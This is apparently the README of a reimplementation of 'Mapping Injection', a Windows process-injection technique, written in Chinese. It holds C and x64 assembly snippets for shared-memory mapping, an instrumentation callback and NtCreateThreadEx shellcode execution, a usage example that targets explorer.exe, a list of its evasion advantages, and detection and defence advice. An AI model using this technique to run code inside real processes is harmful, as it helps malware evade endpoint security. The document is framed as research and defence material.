# Mapping Injection - 映射注入

## 概述

Mapping Injection 是一种创新的进程注入技术，完全避免使用传统的 `VirtualAllocEx`、`WriteProcessMemory` 和 `CreateRemoteThread` API。它利用 Windows 10 1703+ 引入的 `MapViewOfFile3` API 和 `ProcessInstrumentationCallback` 机制来实现隐蔽注入。

**原作者**: antonioCoco (@splinter_code)
**要求**: Windows 10 1703+ (Build 15063) 或更高版本

## 核心思想

传统注入的 syscall 模式：
```
VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
```

Mapping Injection 的 syscall 模式：
```
OpenProcess ->
(CreateFileMapping -> MapViewOfFile3[当前进程] -> MapViewOfFile3[目标进程]) x 2 次 ->
NtSetInformationProcess
```

## 技术原理

### 1. **共享内存映射**

```c
// 创建文件映射对象（共享内存）
HANDLE hFileMap = CreateFileMapping(
    INVALID_HANDLE_VALUE,      // 不关联文件
    NULL,
    PAGE_EXECUTE_READWRITE,
    0,
    size,
    NULL
);

// 映射到当前进程（写入数据）
LPVOID localAddr = MapViewOfFile3(
    hFileMap,
    GetCurrentProcess(),
    NULL,
    0,
    0,
    0,
    PAGE_READWRITE,
    NULL,
    0
);

// 写入数据
memcpy(localAddr, data, size);

// 映射到目标进程（相同内存，不同地址）
LPVOID remoteAddr = MapViewOfFile3(
    hFileMap,
    hTargetProcess,
    NULL,
    0,
    0,
    0,
    PAGE_EXECUTE_READ,
    NULL,
    0
);
```

### 2. **ProcessInstrumentationCallback**

这是 Windows 的一个 undocumented 特性，允许在进程执行系统调用时触发回调。

```c
typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG Version;     // x64 = 0, x86 = 1
    ULONG Reserved;    // 总是 0
    PVOID Callback;    // Callback 地址
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

NtSetInformationProcess(
    hProcess,
    ProcessInstrumentationCallback,  // 40
    &callbackInfo,
    sizeof(callbackInfo)
);
```

### 3. **Callback 机制**

当目标进程执行系统调用时，callback 被触发：

```
1. 目标进程执行 syscall
2. 内核调用设置的 instrumentation callback
3. Callback 检查全局标志（防止递归）
4. Callback 调用 DisposableHook
5. DisposableHook 调用 NtCreateThreadEx 创建线程执行 shellcode
6. 设置全局标志为 1（防止再次执行）
7. 恢复原始执行流
```

## 注入流程

```
阶段 1: 注入全局变量
  └── CreateFileMapping + MapViewOfFile3 x 2
      ├── 映射到当前进程（写入 0x00）
      └── 映射到目标进程（相同内存）

阶段 2: 准备 Callback + Shellcode
  ├── 修改 callback 中的全局变量地址（偏移 +2）
  └── 拼接：callback + shellcode

阶段 3: 注入 Callback + Shellcode
  └── CreateFileMapping + MapViewOfFile3 x 2
      ├── 映射到当前进程（写入 callback+shellcode）
      └── 映射到目标进程（PAGE_EXECUTE_READ）

阶段 4: 设置 Instrumentation Callback
  └── NtSetInformationProcess(ProcessInstrumentationCallback)

阶段 5: 等待触发
  └── 目标进程执行任意 syscall
      └── Callback 被触发
          └── NtCreateThreadEx(shellcode)
              └── Shellcode 执行
```

## Callback 结构分析

### Callback Shellcode

```assembly
; 检查全局标志（防止递归）
mov rdx, 0x7fffffffffff    ; 全局变量地址（运行时填充）
cmp byte [rdx], 0
je callback_start          ; 如果为 0，执行 callback
jmp restore_execution      ; 否则跳过

callback_start:
    ; 保存寄存器
    push r10, rax, rbx, rbp, rdi, rsi, rsp
    push r12, r13, r14, r15

    ; Shadow space
    sub rsp, 32

    ; 调用 DisposableHook(shellcode_addr, &global_var)
    lea rcx, [shellcode_placeholder]
    call DisposableHook

    ; 恢复栈和寄存器
    add rsp, 32
    pop r15, r14, r13, r12
    pop rsp, rsi, rdi, rbp, rbx, rax, r10

restore_execution:
    jmp r10    ; 恢复原始 RIP
```

### DisposableHook

```c
void DisposableHook(LPVOID shellcodeAddr, char *threadCreated) {
    NTSTATUS status;
    HANDLE tHandle = NULL;
    OBJECT_ATTRIBUTES objAttr = { sizeof(objAttr) };

    // 原子交换，防止多线程重复执行
    if (InterlockedExchange8(threadCreated, 1) == 1)
        return;

    // 调用 NtCreateThreadEx 创建线程执行 shellcode
    status = NtCreateThreadEx(
        &tHandle,
        GENERIC_EXECUTE,
        &objAttr,
        (HANDLE)-1,                // 当前进程
        shellcodeAddr,
        NULL,
        FALSE,
        0, 0, 0,
        NULL
    );

    if (status != 0)
        InterlockedExchange8(threadCreated, 0);  // 失败则重置标志
}
```

### NtCreateThreadEx Syscall 号动态查找

```assembly
NtCreateThreadEx:
    mov rax, [gs:60h]              ; 获取 PEB
    cmp dword [rax+120h], 10240    ; 检查 Build 号
    je  build_10240
    ; ... 更多版本检查 ...

build_10240:
    mov eax, 0xb3                  ; Win10 1507 的 syscall 号
    jmp do_syscall

do_syscall:
    mov r10, rcx
    syscall
    ret
```

## 代码结构

```
35-mapping-injection/
├── src/
│   └── mapping_injection.c     # 完整实现（470+ 行）
├── build.sh                     # 编译脚本
└── README.md                    # 本文档
```

## 编译

```bash
chmod +x build.sh
./build.sh
```

要求：
- GCC 编译器
- Windows 10 1703+ (MapViewOfFile3 API)

## 使用方法

```bash
# 需要管理员权限（SeDebugPrivilege）
./mapping_injection.exe
```

程序会：
1. 启用 Debug 权限
2. 查找 explorer.exe 进程
3. 注入全局变量和 callback
4. 设置 Instrumentation Callback
5. 等待 explorer.exe 执行 syscall（会自动触发）

成功后，会弹出一个来自 explorer.exe 的 MessageBox。

## 技术特点

### 优势
- ✅ 无 VirtualAllocEx（使用 MapViewOfFile3）
- ✅ 无 WriteProcessMemory（使用共享内存）
- ✅ 无 CreateRemoteThread（使用 NtCreateThreadEx）
- ✅ 隐蔽的 syscall 模式
- ✅ 利用 undocumented 特性（ProcessInstrumentationCallback）
- ✅ 自动触发（任意 syscall 都会触发 callback）
- ✅ 防止递归（全局标志位）

### 局限性
- ❌ Windows 10 1703+ Only（依赖 MapViewOfFile3）
- ❌ 需要 SeDebugPrivilege
- ❌ x64 Only（callback shellcode 是 x64 汇编）
- ❌ ProcessInstrumentationCallback 是 undocumented API
- ❌ 较新版本 Windows 可能移除此特性

## 关键 API

### MapViewOfFile3

```c
PVOID MapViewOfFile3(
    HANDLE FileMapping,          // 文件映射对象句柄
    HANDLE Process,              // 目标进程句柄
    PVOID BaseAddress,           // 基地址（NULL = 自动选择）
    ULONG64 Offset,              // 偏移
    SIZE_T ViewSize,             // 视图大小
    ULONG AllocationType,        // 分配类型
    ULONG PageProtection,        // 内存保护
    MEM_EXTENDED_PARAMETER* ExtendedParameters,
    ULONG ParameterCount
);
```

**特点**：
- Windows 10 1703+ 引入
- 允许跨进程映射同一内存
- 支持指定目标进程
- 无需 WriteProcessMemory

### NtSetInformationProcess

```c
NTSTATUS NtSetInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);
```

**ProcessInstrumentationCallback (40)**：
- 设置系统调用拦截回调
- 每次 syscall 都会触发
- Callback 在目标进程上下文执行
- 需要 Debug 权限

## 与其他技术对比

| 技术 | VirtualAllocEx | WriteProcessMemory | CreateRemoteThread | 特殊要求 |
|-----|---------------|-------------------|-------------------|---------|
| Classic Injection | ✅ | ✅ | ✅ | 无 |
| Stack Bombing | ✅ | ❌ | ❌ | 无 |
| GhostInjector | ❌ | ❌ | ❌ | NThread 框架 |
| GhostWriting | ❌ | ❌ | ❌ | 32-bit |
| **Mapping Injection** | **❌** | **❌** | **❌** | **Win10 1703+** |

## 检测与防御

⚠️ **仅供学习和防御性研究使用**

### 检测点
1. **MapViewOfFile3 监控**: 检测跨进程的内存映射
2. **ProcessInstrumentationCallback**: 监控 NtSetInformationProcess(40) 调用
3. **异常 syscall 模式**: 缺少 VirtualAllocEx/WriteProcessMemory/CreateRemoteThread
4. **共享内存分析**: 检测 PAGE_EXECUTE_READ 的共享映射
5. **Callback 签名**: 扫描 callback shellcode 特征

### 防御建议
- 使用 EDR 监控 `NtSetInformationProcess` 的异常使用
- 检测 `MapViewOfFile3` 的跨进程调用
- 监控 `CreateFileMapping` + 可执行权限的组合
- 实施 PPL (Protected Process Light) 保护关键进程
- 更新到最新 Windows 版本（可能修复此特性）

## 技术演化

```
2019: Mapping Injection (antonioCoco)
  └── 首次利用 MapViewOfFile3 + ProcessInstrumentationCallback

2020: Hooking Nirvana (Alex Ionescu)
  └── ProcessInstrumentationCallback 的深入研究
  └── https://github.com/ionescu007/HookingNirvana

2021+: 防御加固
  └── Windows Defender 开始检测此模式
  └── EDR 添加 ProcessInstrumentationCallback 监控
```

## 参考资料

- 原始项目: https://github.com/antonioCoco/Mapping-Injection
- 技术博客: https://splintercod3.blogspot.com/p/weaponizing-mapping-injection-with.html
- Hooking Nirvana: https://github.com/ionescu007/HookingNirvana
- MapViewOfFile3 文档: Microsoft Docs
- ProcessInstrumentationCallback: Alex Ionescu's Research

## 实现细节

### 共享内存工作原理

```
                    CreateFileMapping
                           |
                           v
        +----------------------------------+
        |     File Mapping Object          |
        |  (PAGE_EXECUTE_READWRITE)        |
        +----------------------------------+
                    /              \
                   /                \
                  v                  v
         MapViewOfFile3       MapViewOfFile3
         (Current Process)    (Target Process)
                |                    |
                v                    v
         [Local Memory]        [Remote Memory]
            0xXXXX                0xYYYY
                |                    |
                +--------------------+
                    Same Physical Memory
```

### Callback 触发时机

```
Target Process 执行：
├── User Mode Code
│   └── 调用 Windows API
│       └── API 内部调用 syscall
│           └── 进入内核态
│               └── 内核检测到 Instrumentation Callback
│                   └── 调用 Callback（用户态）
│                       └── Callback 调用 NtCreateThreadEx
│                           └── 创建线程执行 Shellcode
│                               └── 返回原始执行流
└── 继续正常执行
```

### 内存布局

```
Target Process Memory:
+---------------------------+
| ...                       |
+---------------------------+
| Shared Mapping 1:         |
| +----------------------+  |
| | Global Variable (RW) |  | <- 0x00（防止递归）
| +----------------------+  |
+---------------------------+
| Shared Mapping 2:         |
| +----------------------+  |
| | Callback (RX)        |  | <- Instrumentation Callback 地址
| | DisposableHook       |  |
| | NtCreateThreadEx     |  |
| | Shellcode            |  | <- 实际 payload
| +----------------------+  |
+---------------------------+
| ...                       |
+---------------------------+
```

---

**实现状态**: ✅ 完整实现原始版本
**编译状态**: ✅ 编译成功
**测试状态**: ⚠️ 需要 Windows 10 1703+ 和管理员权限
